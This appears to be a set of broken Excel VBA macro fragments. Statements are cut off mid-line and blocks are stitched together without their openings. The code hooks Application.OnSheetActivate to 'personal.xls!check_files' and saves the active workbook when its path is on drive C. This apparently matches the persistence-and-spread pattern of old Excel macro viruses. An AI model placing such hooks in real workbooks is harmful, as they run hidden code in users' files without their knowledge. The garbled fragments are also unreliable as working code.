        Application.OnSheetActivate = "personal.xls!check_files"

          Workbooks(n4$).She Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "personal.xls!check_files"
    Case Else
End Select
End Sub

            FF = Worksheets.Count

            Next
            AAAA$ = ActiveWorkbook.Path
            If Mid$(AAAA$, 1, 1) = "C" Or Mid$(AAAA$, 1, 1) = "C" Then
                ActiveWorkbook.Save
            Else
            End If
        Else
        End If
    Else
    End If
Application.ScreenUpdating = True
End Sub
